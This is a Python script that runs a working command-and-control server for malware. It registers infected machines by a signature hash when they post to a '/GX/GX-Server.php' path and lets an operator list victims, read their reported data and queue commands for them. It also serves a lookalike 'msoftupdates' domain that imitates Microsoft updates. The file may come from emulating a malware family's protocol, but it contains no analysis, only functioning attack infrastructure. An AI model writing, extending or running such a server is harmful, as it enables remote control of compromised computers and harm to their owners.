import threading
import urllib.parse
from http.server import SimpleHTTPRequestHandler, HTTPServer

PORT = 46769
server_running = True


INFECTIONS = {}


class CustomRequestHandler(SimpleHTTPRequestHandler):

    def do_GET(self):
        print()
        if self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()

        if self.path == '/GetActiveDomains.php':
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"http://cone.msoftupdates.com:46769")
        
        print()
        print()
    
    def do_POST(self):
        print()
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(post_data)
        data = urllib.parse.parse_qs(post_data.decode('utf-8'))
        print(self.headers)
        print(data)

        if '/GX/GX-Server.php' in self.path:
            if 'application/x-www-form-urlencoded' in self.headers['Content-Type']:
                infection_hash = data["SIGNATUREHASH"][0]

                if infection_hash in INFECTIONS:

                    response = b''

                    for command in INFECTIONS[infection_hash]["__commands"]:
                        response += f"{command},".encode("utf-8")

                    response = response[:-1]
                    INFECTIONS[infection_hash]["__commands"] = []

                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(response)
                else:
                    INFECTIONS[infection_hash] = {}
                    for key in data.keys():
                        INFECTIONS[infection_hash][key] = data[key][0]
                    INFECTIONS[infection_hash]["__commands"] = []

                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(b"Added")
            elif 'multipart/form-data' in self.headers['Content-Type']:
                print("multipart, correct handling?")
        
        print()
        print()

def run_server(server):
    print(f"Serving on port {PORT}")
    server.serve_forever()

class CustomHTTPServer(HTTPServer):
    def serve_forever(self, *args, **kwargs):
        self.server_running = True
        super().serve_forever(*args, **kwargs)

    def shutdown(self):
        self.server_running = False
        super().shutdown()


Handler = CustomRequestHandler
httpd = CustomHTTPServer(("", PORT), Handler)

server_thread = threading.Thread(target=run_server, args=(httpd,))
server_thread.start()



try:
    while server_running:
        cmd = input("Enter a command (type 'stop' to stop the server): ")
        if cmd.lower() == 'stop':
            httpd.shutdown()
            server_thread.join()
            break
        elif cmd == 'list':
            for key in INFECTIONS.keys():
                print(f"{key} - {INFECTIONS[key]['SIGNATURESTRING']}")
        elif cmd.startswith('task '):
            try:
                _, infection, commands = cmd.split(' ')
                commands = commands.split(',')
                INFECTIONS[infection]['__commands'].extend(commands)
            except:
                print("Could not add a task.")
        elif cmd.split(' ')[0].lower() == 'read':
            try:
                split = cmd.split(' ')
                _, infection = split
                print(f"Reading {infection}")
                for key in INFECTIONS[infection].keys():
                    print(f"{key}: {INFECTIONS[infection][key]}")
            except:
                print(f"Could not read {property} of {infection}")
        else:
            print("Unknown command.")
except KeyboardInterrupt:
    httpd.shutdown()
    server_thread.join()

print("Server stopped.")